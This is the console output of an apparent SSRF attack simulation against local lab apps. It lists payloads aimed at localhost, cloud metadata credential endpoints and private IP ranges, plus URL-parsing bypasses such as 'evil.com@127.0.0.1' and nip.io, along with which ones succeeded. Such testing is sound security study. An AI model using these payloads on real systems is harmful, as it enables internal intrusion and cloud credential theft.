@@ -1,0 +1,298 @@
+C:\Users\DELL\Downloads\CyberSecurity>python ssrfattack.py
+🚀 Starting SSRF Attack Simulation...
+Note: Make sure both apps are running:
+  - Vulnerable Proxy: python app.py (port 5000)
+  - Local Dashboard: python localhashboard.py (port 80)
+
+
+🔍 Testing Local Dashboard Access via SSRF...
+Testing: http://localhost:5000/get?url=http://localhost:80/
+✅ SUCCESS: Accessed http://localhost:80/
+Testing: http://localhost:5000/get?url=http://localhost:80/admin
+❌ FAILED: Could not access http://localhost:80/admin
+Testing: http://localhost:5000/get?url=http://localhost:80/api/data
+✅ SUCCESS: Accessed http://localhost:80/api/data
+Testing: http://localhost:5000/get?url=http://127.0.0.1:80/
+✅ SUCCESS: Accessed http://127.0.0.1:80/
+Testing: http://localhost:5000/get?url=http://0.0.0.0:80/
+❌ FAILED: Could not access http://0.0.0.0:80/
+
+🔍 Testing Cloud Metadata Services...
+Testing: http://169.254.169.254/latest/meta-data/
+❌ ERROR: http://169.254.169.254/latest/meta-data/ - HTTPConnectionPool(host='localhost', port=5000): Read timed out. (read timeout=3)
+Testing: http://169.254.169.254/latest/user-data/
+❌ ERROR: http://169.254.169.254/latest/user-data/ - HTTPConnectionPool(host='localhost', port=5000): Read timed out. (read timeout=3)
+Testing: http://169.254.169.254/latest/meta-data/iam/
+❌ ERROR: http://169.254.169.254/latest/meta-data/iam/ - HTTPConnectionPool(host='localhost', port=5000): Read timed out. (read timeout=3)
+Testing: http://169.254.169.254/latest/meta-data/security-credentials/
+❌ ERROR: http://169.254.169.254/latest/meta-data/security-credentials/ - HTTPConnectionPool(host='localhost', port=5000): Read timed out. (read timeout=3)
+Testing: http://metadata.google.internal/
+❌ INACCESSIBLE: http://metadata.google.internal/
+Testing: http://169.254.169.254/metadata/instance
+❌ ERROR: http://169.254.169.254/metadata/instance - HTTPConnectionPool(host='localhost', port=5000): Read timed out. (read timeout=3)
+Testing: http://100.100.100.200/latest/meta-data/
+❌ ERROR: http://100.100.100.200/latest/meta-data/ - HTTPConnectionPool(host='localhost', port=5000): Read timed out. (read timeout=3)
+
+🔍 Testing Internal Network Scanning...
+Testing: http://192.168.1.1:80/
+✅ INTERNAL SERVICE FOUND: http://192.168.1.1:80/
+Testing: http://192.168.1.1:443/
+Testing: http://192.168.1.2:80/
+Testing: http://192.168.1.2:443/
+Testing: http://10.0.0.1:80/
+Testing: http://10.0.0.1:443/
+Testing: http://10.0.0.2:80/
+Testing: http://10.0.0.2:443/
+Testing: http://172.16.0.1:80/
+Testing: http://172.16.0.1:443/
+
+🔍 Testing SSRF Bypass Techniques...
+Testing bypass: http://127.0.0.1:80/
+✅ BYPASS SUCCESS: http://127.0.0.1:80/
+Testing bypass: http://0177.0.0.1:80/
+❌ Bypass failed: http://0177.0.0.1:80/
+Testing bypass: http://0x7f.0.0.1:80/
+❌ Bypass failed: http://0x7f.0.0.1:80/
+Testing bypass: http://2130706433:80/
+❌ ERROR: http://2130706433:80/ - HTTPConnectionPool(host='localhost', port=5000): Read timed out. (read timeout=3)
+Testing bypass: http://127.1:80/
+❌ Bypass failed: http://127.1:80/
+Testing bypass: http://[::1]:80/
+❌ Bypass failed: http://[::1]:80/
+Testing bypass: http://[::]:80/
+❌ Bypass failed: http://[::]:80/
+Testing bypass: http://localhost.:80/
+✅ BYPASS SUCCESS: http://localhost.:80/
+Testing bypass: http://127.0.0.1.nip.io:80/
+✅ BYPASS SUCCESS: http://127.0.0.1.nip.io:80/
+Testing bypass: http://localtest.me:80/
+✅ BYPASS SUCCESS: http://localtest.me:80/
+Testing bypass: http://subdomain.localhost:80/
+❌ Bypass failed: http://subdomain.localhost:80/
+Testing bypass: http://127.0.0.1@evil.com:80/
+❌ Bypass failed: http://127.0.0.1@evil.com:80/
+Testing bypass: http://evil.com@127.0.0.1:80/
+✅ BYPASS SUCCESS: http://evil.com@127.0.0.1:80/
+Testing bypass: http://127.0.0.1#@evil.com:80/
+✅ BYPASS SUCCESS: http://127.0.0.1#@evil.com:80/
+Testing bypass: http://127.0.0.1?@evil.com:80/
+✅ BYPASS SUCCESS: http://127.0.0.1?@evil.com:80/
+
+============================================================
+🎯 SSRF TEST REPORT
+============================================================
+Target Proxy: http://localhost:5000/get
+Total tests: 37
+Successful accesses: 11
+Vulnerable endpoints: 11
+
+📋 DETAILED RESULTS:
+------------------------------------------------------------
+✅ VULNERABLE: Access http://localhost:80/
+   Status: 200, Length: 11935
+   Preview:
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" conten...
+
+❌ SAFE: Access http://localhost:80/admin
+   Status: 200, Length: 207
+   Preview: <!doctype html>
+<html lang=en>
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL ...
+
+✅ VULNERABLE: Access http://localhost:80/api/data
+   Status: 200, Length: 173
+   Preview: {"data":{"server_status":"running","users_count":1524,"version":"1.0.0"},"endpoints":["/admin","/api...
+
+✅ VULNERABLE: Access http://127.0.0.1:80/
+   Status: 200, Length: 11935
+   Preview:
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" conten...
+
+❌ SAFE: Access http://0.0.0.0:80/
+   Status: 500, Length: 53788
+   Preview: <!doctype html>
+<html lang=en>
+  <head>
+    <title>requests.exceptions.ConnectionError: HTTPConnecti...
+
+❌ SAFE: Metadata: http://169.254.169.254/latest/meta-data/
+   Error: HTTPConnectionPool(host='localhost', port=5000): Read timed out. (read timeout=3)
+
+❌ SAFE: Metadata: http://169.254.169.254/latest/user-data/
+   Error: HTTPConnectionPool(host='localhost', port=5000): Read timed out. (read timeout=3)
+
+❌ SAFE: Metadata: http://169.254.169.254/latest/meta-data/iam/
+   Error: HTTPConnectionPool(host='localhost', port=5000): Read timed out. (read timeout=3)
+
+❌ SAFE: Metadata: http://169.254.169.254/latest/meta-data/security-credentials/
+   Error: HTTPConnectionPool(host='localhost', port=5000): Read timed out. (read timeout=3)
+
+❌ SAFE: Metadata: http://metadata.google.internal/
+   Status: 500, Length: 54342
+   Preview: <!doctype html>
+<html lang=en>
+  <head>
+    <title>requests.exceptions.ConnectionError: HTTPConnecti...
+
+❌ SAFE: Metadata: http://169.254.169.254/metadata/instance
+   Error: HTTPConnectionPool(host='localhost', port=5000): Read timed out. (read timeout=3)
+
+❌ SAFE: Metadata: http://100.100.100.200/latest/meta-data/
+   Error: HTTPConnectionPool(host='localhost', port=5000): Read timed out. (read timeout=3)
+
+✅ VULNERABLE: Internal: http://192.168.1.1:80/
+   Status: 200, Length: N/A
+   Preview: Status: 200, Length: 11935
+
+❌ SAFE: Internal: http://192.168.1.1:443/
+   Error: HTTPConnectionPool(host='localhost', port=5000): Read timed out. (read timeout=2)
+
+❌ SAFE: Internal: http://192.168.1.2:80/
+   Error: HTTPConnectionPool(host='localhost', port=5000): Read timed out. (read timeout=2)
+
+❌ SAFE: Internal: http://192.168.1.2:443/
+   Error: HTTPConnectionPool(host='localhost', port=5000): Read timed out. (read timeout=2)
+
+❌ SAFE: Internal: http://10.0.0.1:80/
+   Error: HTTPConnectionPool(host='localhost', port=5000): Read timed out. (read timeout=2)
+
+❌ SAFE: Internal: http://10.0.0.1:443/
+   Error: HTTPConnectionPool(host='localhost', port=5000): Read timed out. (read timeout=2)
+
+❌ SAFE: Internal: http://10.0.0.2:80/
+   Error: HTTPConnectionPool(host='localhost', port=5000): Read timed out. (read timeout=2)
+
+❌ SAFE: Internal: http://10.0.0.2:443/
+   Error: HTTPConnectionPool(host='localhost', port=5000): Read timed out. (read timeout=2)
+
+❌ SAFE: Internal: http://172.16.0.1:80/
+   Error: HTTPConnectionPool(host='localhost', port=5000): Read timed out. (read timeout=2)
+
+❌ SAFE: Internal: http://172.16.0.1:443/
+   Error: HTTPConnectionPool(host='localhost', port=5000): Read timed out. (read timeout=2)
+
+✅ VULNERABLE: Bypass: http://127.0.0.1:80/
+   Status: 200, Length: N/A
+   Preview:
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" conten...
+
+❌ SAFE: Bypass: http://0177.0.0.1:80/
+   Status: 500, Length: N/A
+   Preview: <!doctype html>
+<html lang=en>
+  <head>
+    <title>requests.exceptions.ConnectionError: HTTPConnecti...
+
+❌ SAFE: Bypass: http://0x7f.0.0.1:80/
+   Status: 500, Length: N/A
+   Preview: <!doctype html>
+<html lang=en>
+  <head>
+    <title>requests.exceptions.ConnectionError: HTTPConnecti...
+
+❌ SAFE: Bypass: http://2130706433:80/
+   Error: HTTPConnectionPool(host='localhost', port=5000): Read timed out. (read timeout=3)
+
+❌ SAFE: Bypass: http://127.1:80/
+   Status: 500, Length: N/A
+   Preview: <!doctype html>
+<html lang=en>
+  <head>
+    <title>requests.exceptions.ConnectionError: HTTPConnecti...
+
+❌ SAFE: Bypass: http://[::1]:80/
+   Status: 500, Length: N/A
+   Preview: <!doctype html>
+<html lang=en>
+  <head>
+    <title>requests.exceptions.ConnectionError: HTTPConnecti...
+
+❌ SAFE: Bypass: http://[::]:80/
+   Status: 500, Length: N/A
+   Preview: <!doctype html>
+<html lang=en>
+  <head>
+    <title>requests.exceptions.ConnectionError: HTTPConnecti...
+
+✅ VULNERABLE: Bypass: http://localhost.:80/
+   Status: 200, Length: N/A
+   Preview:
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" conten...
+
+✅ VULNERABLE: Bypass: http://127.0.0.1.nip.io:80/
+   Status: 200, Length: N/A
+   Preview:
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" conten...
+
+✅ VULNERABLE: Bypass: http://localtest.me:80/
+   Status: 200, Length: N/A
+   Preview:
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" conten...
+
+❌ SAFE: Bypass: http://subdomain.localhost:80/
+   Status: 500, Length: N/A
+   Preview: <!doctype html>
+<html lang=en>
+  <head>
+    <title>requests.exceptions.ConnectionError: HTTPConnecti...
+
+❌ SAFE: Bypass: http://127.0.0.1@evil.com:80/
+   Status: 200, Length: N/A
+   Preview: Access Denied. You do not have permission to perform this action. Contact your administrator
+
+
+✅ VULNERABLE: Bypass: http://evil.com@127.0.0.1:80/
+   Status: 200, Length: N/A
+   Preview:
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" conten...
+
+✅ VULNERABLE: Bypass: http://127.0.0.1#@evil.com:80/
+   Status: 200, Length: N/A
+   Preview:
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" conten...
+
+✅ VULNERABLE: Bypass: http://127.0.0.1?@evil.com:80/
+   Status: 200, Length: N/A
+   Preview:
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" conten...
+
+
+C:\Users\DELL\Downloads\CyberSecurity>
